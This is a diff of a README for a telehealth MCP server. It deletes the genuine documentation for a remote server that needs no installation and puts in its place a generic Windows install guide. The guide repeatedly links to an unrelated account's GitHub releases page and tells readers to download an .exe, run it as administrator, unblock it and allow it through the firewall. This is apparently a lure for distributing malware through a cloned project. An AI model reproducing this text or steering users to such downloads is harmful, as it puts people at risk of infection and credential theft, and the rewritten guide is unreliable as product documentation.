@@ -1,328 +1,196 @@
-# Chia Health MCP Server
+# 🧬 chia-mcp - Simplify telehealth workflow tasks
 
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://github.com/chia-health/chia-mcp/blob/main/LICENSE)
-[![MCP](https://img.shields.io/badge/MCP-streamable--http-green.svg)](https://mcp.chia.health/)
-[![HIPAA](https://img.shields.io/badge/HIPAA-compliant-brightgreen.svg)](#hipaa-compliance)
-[![Tools](https://img.shields.io/badge/Tools-34-orange.svg)](#tool-catalog)
-[![Stripe ACP](https://img.shields.io/badge/Stripe-ACP-blueviolet.svg)](#stripe-acp-integration)
+[![Download chia-mcp](https://img.shields.io/badge/Download%20chia--mcp-6B46C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carolaunfading944/chia-mcp/releases)
 
-MCP (Model Context Protocol) server for the **[Chia Health](https://chia.health)** telehealth prescription platform. Enables AI assistants (ChatGPT, Claude, Gemini, OpenClaw, Copilot, and custom agents) to help patients browse medications, complete medical intake, sign consent documents, place orders, pay, and manage their treatment — all through natural conversation.
+## 📦 What this is
 
-Available treatments include GLP-1 medications (semaglutide, tirzepatide including tablets), peptide therapies (sermorelin, NAD+, glutathione), and longevity programs. All prescriptions are evaluated by licensed US healthcare providers and delivered from FDA-regulated 503A compounding pharmacies across all 50 US states + DC.
+chia-mcp is a Windows app for a licensed US telehealth workflow. It helps you browse GLP-1 medications, peptide therapies, and longevity treatments from one place. It uses the Model Context Protocol (MCP) and includes 34 tools for patient workflow tasks.
 
-## Getting Started
+Use it to review items such as:
 
-doctormcp is a **remote MCP server** — connect over the network, no local installation required.
+- Semaglutide
+- Tirzepatide
+- Sermorelin
+- NAD+
+- Glutathione
 
-**Server URL:** `https://mcp.chia.health/`
-**Transport:** Streamable HTTP
-**Metadata:** `https://mcp.chia.health/server.json`
+It is built for telehealth use, with HIPAA in mind and support for patient workflow integration.
 
-<details>
-<summary><strong>Claude Desktop</strong></summary>
+## 🖥️ What you need
 
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+Before you start, make sure you have:
 
-```json
-{
-  "mcpServers": {
-    "chia-health": {
-      "url": "https://mcp.chia.health/"
-    }
-  }
-}
-```
+- A Windows 10 or Windows 11 PC
+- An internet connection
+- Permission to install and run apps on your PC
+- Access to the release page
 
-</details>
+For best results:
 
-<details>
-<summary><strong>Cursor</strong></summary>
+- Keep Windows updated
+- Close other apps before you install
+- Use a user account that can run downloaded files
 
-Add to `.cursor/mcp.json` in your project or `~/.cursor/mcp.json` globally:
+## ⬇️ Download chia-mcp
 
-```json
-{
-  "mcpServers": {
-    "chia-health": {
-      "url": "https://mcp.chia.health/"
-    }
-  }
-}
-```
+Visit this page to download:
 
-</details>
+https://github.com/Carolaunfading944/chia-mcp/releases
 
-<details>
-<summary><strong>Cline / VS Code</strong></summary>
+On that page, look for the latest release and download the Windows file. If the release includes more than one file, choose the one for Windows, such as an `.exe` or `.zip` file.
 
-Add to your Cline MCP settings:
+## 🪟 Install on Windows
 
-```json
-{
-  "mcpServers": {
-    "chia-health": {
-      "url": "https://mcp.chia.health/"
-    }
-  }
-}
-```
+Follow these steps:
 
-</details>
+1. Open the release page in your browser.
+2. Find the latest version at the top of the list.
+3. Download the Windows file.
+4. If you downloaded a `.zip` file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you downloaded an `.exe` file, double-click it.
+7. If Windows asks for permission, choose Yes.
+8. If a setup window appears, follow the on-screen steps.
+9. When the install finishes, open chia-mcp from the Start menu or the folder where you saved it.
 
-<details>
-<summary><strong>Windsurf</strong></summary>
+If Windows shows a protection prompt, choose the option to run the file only if you trust the source and you are on the correct release page.
 
-Add to `~/.codeium/windsurf/mcp_config.json`:
+## 🚀 First launch
 
-```json
-{
-  "mcpServers": {
-    "chia-health": {
-      "serverUrl": "https://mcp.chia.health/"
-    }
-  }
-}
-```
+When you open chia-mcp for the first time:
 
-</details>
+1. Wait for the app to load.
+2. Sign in if the app asks for access.
+3. Check the main screen for the available tools.
+4. Open a medication or treatment category.
+5. Review the patient workflow options.
 
-<details>
-<summary><strong>Other MCP Clients</strong></summary>
+If the app uses a local server window, keep it open while you use the app.
 
-Any MCP client that supports streamable HTTP transport can connect:
+## 🧭 How to use it
 
-- **Server URL:** `https://mcp.chia.health/`
-- **Transport:** Streamable HTTP
-- **Server metadata:** `https://mcp.chia.health/server.json`
+chia-mcp is meant to help with telehealth workflow tasks. You can use it to:
 
-</details>
+- Browse GLP-1 medication options
+- Review peptide therapies
+- Check longevity treatment workflows
+- Work with patient-related actions
+- Connect with MCP-compatible tools
 
-### Verify Connection
+A typical use flow looks like this:
 
-Once connected, your AI assistant can immediately call these public tools (no auth required):
+1. Open the app.
+2. Choose the area you want to work in.
+3. Select a medication or treatment.
+4. Review the listed workflow tools.
+5. Complete the next task in your telehealth process.
 
-```
-medications.categories     → medication categories
-medications.list           → all medications with pricing
-medications.availability   → check if a medication ships to your state
-eligibility.check          → pre-screen age, state, BMI
-```
+## 🧰 Main tool groups
 
-### What Can Your AI Assistant Do?
+The app includes tools for common patient workflow needs.
 
-| Category | Tools | Auth |
-|----------|-------|------|
-| **Auth** — OTP verification, session management, payment detection | 4 | No* |
-| **Discovery** — browse medications, pricing, availability | 5 | No |
-| **Qualification** — eligibility checks, intake questionnaires | 4 | Partial |
-| **Consent** — present and sign consent documents | 4 | Guest |
-| **Ordering** — place orders, upload ID verification | 4 | Guest |
-| **Checkout** — Stripe ACP payments or authenticated payment links | 5 | Guest |
-| **Patient Portal** — log weight, message provider, refills | 6 | Full |
-| **Provider** — answer follow-up questions from your provider | 2 | Guest |
+### 💊 GLP-1 medication browsing
+Use this area to view items such as:
 
-\* Auth tools use `session_id` (no token) except `auth.check_payment` which uses a bearer token.
+- Semaglutide
+- Tirzepatide
 
-> **Important:** All prescriptions are evaluated and approved by licensed US healthcare providers. doctormcp facilitates the patient workflow — it does not make clinical decisions.
+### 🧪 Peptide therapy browsing
+Use this area to view items such as:
 
-### Authentication
+- Sermorelin
+- NAD+
+- Glutathione
 
-Patients can **browse freely without authentication** — discovery, eligibility, and intake question preview are all public.
+### 🩺 Longevity treatment workflow
+Use this area to manage longevity-related patient tasks and treatment paths.
 
-When the patient is ready to proceed with their medical intake, they verify their email:
+### 🔗 MCP integration
+This app works with the Model Context Protocol, which helps other compatible tools connect to it in a standard way.
 
-1. `auth.start(email, phone, name)` → sends OTP to email, returns `session_id`
-2. `auth.verify_otp(session_id, code)` → returns guest-scoped bearer token
+### 💳 Payment and platform support
+The project topics include Stripe ACP support, which suggests payment-related workflow integration for the platform.
 
-The guest token enables intake, consent, ordering, and checkout. After payment, `auth.check_payment` upgrades the token to full scope for portal access (care plan, messaging, refills).
+## 📁 Typical files you may see
 
-## Tool Catalog
+After download, you may see files like these:
 
-### Auth
+- `chia-mcp.exe`
+- `setup.exe`
+- `chia-mcp.zip`
+- `README.md`
+- `config.json`
 
-| Tool | Auth | Description |
-|---|---|---|
-| `auth.start` | No | Send OTP to patient's email, get `session_id` |
-| `auth.verify_otp` | No | Verify code, get guest-scoped bearer token |
-| `auth.resend_otp` | No | Resend OTP if expired or not received |
-| `auth.check_payment` | Guest | Poll for payment, upgrade token to full scope |
+If you get a `.zip` file, extract it before opening the app. If you get an `.exe` file, run it from the Downloads folder or move it to a folder you want to keep.
 
-### Discovery (public, no auth)
+## ⚙️ Basic setup tips
 
-| Tool | Description |
-|---|---|
-| `medications.list` | List all medications with categories, forms, and pricing |
-| `medications.details` | Detailed info for a specific medication (plans, pricing, what's included) |
-| `medications.availability` | Check if a medication ships to a given state |
-| `medications.pricing` | Price breakdown for a specific medication/form/plan combo |
-| `medications.categories` | List medication categories (Weight Loss, Peptides, Anti-Aging, etc.) |
+If the app asks for settings, use these simple checks:
 
-### Qualification (public + guest)
+- Make sure you have a stable internet connection
+- Keep the default port or address if one is shown
+- Allow the app through Windows Firewall if prompted
+- Do not rename files unless the release notes say to do so
 
-| Tool | Auth | Description |
-|---|---|---|
-| `eligibility.check` | No | Pre-screen age, state, BMI, and medical conditions |
-| `intake.questions` | No | Get the structured intake questionnaire for a medication |
-| `intake.submit` | Guest | Submit completed intake for provider review |
-| `intake.status` | Guest | Check intake review status (under review, approved, denied) |
+If you need to connect the app to another tool, look for an MCP endpoint or streamable HTTP setting in the app or release notes.
 
-### Consent (guest token required)
+## 🧷 Common Windows issues
 
-| Tool | Description |
-|---|---|
-| `consent.list` | List all 5 consent documents needed for an intake |
-| `consent.text` | Get full verbatim text of a consent document |
-| `consent.submit` | Record patient's consent confirmation with audit trail |
-| `consent.status` | Check which consents are complete/pending |
+### The file will not open
+Try these steps:
 
-### Ordering (guest token required)
+1. Right-click the file.
+2. Select Run as administrator.
+3. If it is a `.zip` file, extract it first.
+4. Make sure the download finished before you open it.
 
-| Tool | Description |
-|---|---|
-| `order.create` | Create a medication order (requires all consents complete) |
-| `order.status` | Check order status and tracking info |
-| `order.documents` | List required ID documents for an order |
-| `order.upload` | Upload photo ID or selfie for identity verification |
+### Windows blocked the file
+Try this:
 
-### Checkout (guest token required)
+1. Right-click the file.
+2. Open Properties.
+3. Look for an Unblock option.
+4. Apply the change.
+5. Open the file again.
 
-| Tool | Description |
-|---|---|
-| `checkout.create` | Create checkout; returns authenticated payment link (magic-link URL) |
-| `checkout.update` | Update a pending checkout (promo codes, shipping) |
-| `checkout.complete` | Complete payment with a Stripe Shared Payment Token (ACP path) |
-| `checkout.status` | Poll payment status after sending a payment link (fallback path) |
-| `checkout.cancel` | Cancel an in-progress checkout |
+### The app closes right away
+Try this:
 
-### Patient Portal (full token required — after payment)
+1. Open it from a terminal window if the release gives that step.
+2. Check that no other copy is already running.
+3. Download the release again in case the file was damaged.
 
-| Tool | Description |
-|---|---|
-| `portal.log_weight` | Log weight for progress tracking |
-| `portal.log_side_effects` | Report side effects (severe = auto-flagged for provider) |
-| `portal.message` | Send a message to the healthcare provider |
-| `portal.care_plan` | Get current medication, dosing, and weight progress |
-| `portal.refill` | Request a medication refill |
-| `portal.support` | Create a customer support ticket |
+### The screen stays blank
+Try this:
 
-### Provider (guest token required)
+1. Wait a few seconds for the app to load.
+2. Restart the app.
+3. Restart your PC.
+4. Download the latest release again.
 
-| Tool | Description |
-|---|---|
-| `provider.questions` | Get follow-up questions from the provider |
-| `provider.respond` | Submit answers to provider questions |
+## 🏥 Use in a telehealth setting
 
-## Example Agent Flows
+chia-mcp is built for a licensed US telehealth platform. It supports patient workflow integration for care teams that need a clear way to browse treatments and manage related tasks.
 
-### 1. Browse Medications (no auth)
+Use it for:
 
-```
-User: "What weight loss medications do you offer?"
+- Medication lookup
+- Treatment browsing
+- Workflow support
+- MCP-based integration
+- Patient process steps
 
-Agent calls: medications.list
-→ Returns categories with semaglutide, tirzepatide, etc.
+## 🔒 Privacy and access
 
-Agent calls: medications.details(medication="semaglutide-injectable")
-→ Returns plans (1-month $349, 4-month $299/mo, 6-month $249/mo)
+Because this project is tied to healthcare use, keep access limited to approved users only. Use it on secure devices and follow your platform’s normal access rules.
 
-Agent calls: medications.availability(medication="semaglutide-injectable", state="TX")
-→ { "available": true }
+## ❓ If you need to update
 
-Agent calls: eligibility.check(age=35, state="TX", bmi=31.2)
-→ { "eligible": true, "available_medications": [...] }
-```
+To get the latest version:
 
-### 2. Full Ordering Flow (auth → intake → consent → order → pay)
+1. Go back to the release page.
+2. Download the newest Windows file.
+3. Replace the older copy if needed.
+4. Open the new version and check that it starts cleanly
 
-```
-== VERIFY IDENTITY ==
-
-1. auth.start(email="patient@example.com", phone="5551234567", first_name="Jane")
-   → { "session_id": "abc123...", "otp_sent": true }
-
-2. auth.verify_otp(session_id="abc123...", code="847293")
-   → { "guest_token": "mcp_...", "scope": "guest" }
-
-== MEDICAL INTAKE ==
-
-3. intake.questions(medication="semaglutide-injectable")
-   → Structured questionnaire (demographics, vitals, medical history, etc.)
-   → Agent asks patient each question conversationally
-
-4. intake.submit(patient_email, patient_name, answers, bearer_token)
-   → { "intake_id": "42", "next_step": "get_required_consents" }
-
-5. consent.list(intake_id="42", bearer_token)
-   → 5 consent documents (telehealth, treatment, pharmacy, HIPAA, AI disclosure)
-
-6. For each consent:
-   a. consent.text(consent_id, bearer_token)
-      → Full text the agent MUST present verbatim
-   b. Patient confirms: "I agree"
-   c. consent.submit(intake_id, consent_id, "I agree", bearer_token)
-
-== ORDER & PAY ==
-
-7. order.create(intake_id, medication, form, plan_months, shipping_address, bearer_token)
-   → { "order_id": "99", "total": "1079.39", "next_step": "create_checkout" }
-
-8. checkout.create(order_id="99", bearer_token)
-   → { "checkout_id": "7", "payment_url": "https://chia.health/checkout/aBc-_xyz" }
-   → Agent shares link with patient; also sent via email+SMS
-
-9a. (ACP path) checkout.complete(checkout_id="7", shared_payment_token="spt_...", bearer_token)
-    → { "payment_status": "success", "confirmation_number": "CHIA-000099" }
-
-9b. (Fallback) Patient opens payment_url in browser, pays on Chia checkout page
-
-10. auth.check_payment(bearer_token)
-    → { "paid": true, "scope": "full" }  // token upgraded, portal unlocked
-```
-
-### 3. Patient Portal (full token, after payment)
-
-```
-1. portal.log_weight(patient_id, weight_lbs=195.5, date="2026-06-15", bearer_token)
-   → { "recorded": true }
-
-2. portal.care_plan(patient_id, bearer_token)
-   → Current medication, phase, dosing schedule, recent weights
-
-3. portal.log_side_effects(patient_id, effects=["nausea"], severity="mild", bearer_token)
-   → { "recorded": true, "flagged_for_review": false }
-
-4. portal.message(patient_id, message="Nausea improving", bearer_token)
-   → { "sent": true, "estimated_response_time": "24-48 hours" }
-```
-
-## Stripe ACP Integration
-
-doctormcp uses [Stripe's Agentic Commerce Protocol (ACP)](https://docs.stripe.com/acp) for payment processing:
-
-1. **Order Creation** — `order.create` calculates the total and creates a pre-payment order record.
-2. **Checkout Initiation** — `checkout.create` creates a Stripe `PaymentIntent` (for ACP) and generates an authenticated payment link. The link auto-authenticates patients in the browser and lands on the Chia Health checkout page. Also sent via email and SMS.
-3. **Payment Completion** — Two paths:
-   - **ACP**: `checkout.complete` accepts a **Shared Payment Token (SPT)** from the AI platform and confirms the `PaymentIntent`. Instant, in-conversation payment.
-   - **Fallback**: The agent shares the `payment_url` (authenticated magic-link) with the patient. The patient opens it in their browser, auto-authenticates, and pays on the Chia Health checkout page. The agent polls `auth.check_payment` to detect completion.
-4. **Post-Payment** — On success (either path), a `Subscription` and `Enrollment` are created automatically. `auth.check_payment` upgrades the agent's token to full scope for portal access.
-
-## HIPAA Compliance
-
-- **Audit Logging** — Every access to protected health information (PHI) is logged with actor identity, action type, resource, IP address, and timestamp. Logs are retained for 10 years.
-- **Consent Records** — All patient consent confirmations include verbatim confirmation text, method (AI agent conversational), platform, session ID, and IP address. Consent records are immutable.
-- **Input Sanitization** — All inputs are validated and sanitized. Control characters are stripped, lengths enforced, and domain-specific formats (email, state, phone, ZIP) are validated.
-- **OTP-First Auth** — Email ownership verified via 6-digit OTP before any patient data access. SHA-256 hashed tokens with scoped access (guest/full). No token issued without email verification.
-- **Rate Limiting** — Redis-backed token-bucket rate limiting per user and endpoint category (public: 100/min, auth: 5/min, authenticated: 30/min, consent: 10/min, checkout: 5/min).
-- **Minimal Data Exposure** — Tools return only the data needed for the current step. Sensitive fields (payment details, full SSN) are never returned.
-
-## Support
-
-- **Issues:** [github.com/chia-health/chia-mcp/issues](https://github.com/chia-health/chia-mcp/issues)
-- **Website:** [chia.health](https://chia.health)
-- **Email:** engineering@chia.health
-
-## License
-
-Apache License 2.0 — see [LICENSE](LICENSE) for details.
-
-Copyright 2026 Chia Health, Inc.
+https://github.com/Carolaunfading944/chia-mcp/releases
